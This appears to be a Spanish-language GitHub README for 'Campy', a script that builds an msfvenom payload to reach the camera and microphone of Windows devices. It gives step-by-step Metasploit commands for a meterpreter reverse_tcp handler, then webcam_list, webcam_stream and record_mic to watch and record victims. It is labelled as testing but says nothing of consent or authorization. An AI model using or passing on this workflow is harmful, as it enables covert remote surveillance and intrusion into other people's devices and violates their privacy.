![Campy-banner](https://user-images.githubusercontent.com/107135484/191642751-89b564d2-0905-461c-8116-feda740b7cbf.png)
<p align="center">
   <img src="https://img.shields.io/badge/STATUS-EN%20DESAROLLO-green">


## Comenzando 🚀

_Campy es un script basico, con el cual podras optimizar la creacion de un paquete venom para hacer pruebas  con metasploit y poder acceder a la camara y microfono de un dispositivo Windows._

Mira **Deployment** para conocer como desplegar el proyecto.


### Pre-requisitos 📋

_1. Actualizar paquetes_
```
sudo apt update && sudo apt upgrade
```

_2. Verifica que tengas pip instalado:_

```
pip --version
```
_Ejecuta, en caso de no tenerlo instalado:_
```
sudo apt-get install python-pip
```
_3. Verifica que tengas git instalado:_

```
git --version
```
_Ejecuta, en caso de no tenerlo instalado:_
```
sudo apt-get install git
```



### Instalación 🔧

_Ahora si clonas el repositorio o lo descargas. Como prefieras_

```
git clone https://github.com/TDI-CO/Campy.git
```
```
cd Campy
```
_Instalamos los requerimientos_

```
sudo pip install pyautogui
```
```
sudo python3 campy.py
```

## Ejecutando las pruebas ⚙️

_Campy utilizara socket para tener tu ip y agregarla al codigo de venom, luego te solicitaara un puerto el cual por defecto puedes poner 4444 y por ultimo un nombre para el paquete_

![Sin-título-1](https://user-images.githubusercontent.com/107135484/191758074-5ffde2c3-1dfe-4d12-9c47-144e20d5065f.png)

_Para poder monitorear:_

```
use exploit/multi/handler
```
```
set payload windows/meterpreter/reverse_tcp
```
_Es muy importante que coloques la misma ip y puertos_
```
set LHOST "TU DIRECCION IP"
```
```
set LPORT "EL PUERTO QUE ELEGISTE"
```
```
show options
```
```
exploit
```
## Monitorear camara 📸

_Primero enlistamos las camaras_
```
webcam_list
```
```
webcam_stream "ELIGE UN NUMERO DE LA LISTA"
```

## Monitorear mricofono 🎤

```
record_mic -d "segundos"
```

## Construido con 🛠️

_Este script fue desarrollado con python_


* **Siguenos en instagram** - *Desarrolladores* - [The Dark Island](https://www.instagram.com/tdi_colombia/)

## Esperamos te sirva 🎁

* Comenta a otros sobre este proyecto 📢
* Invita una cerveza 🍺 o un café ☕ a alguien del equipo.
* Dona a nequi: `323 370 1359`



---
⌨️ con ❤️ por [TDI](https://www.instagram.com/tdi_colombia/) 😊
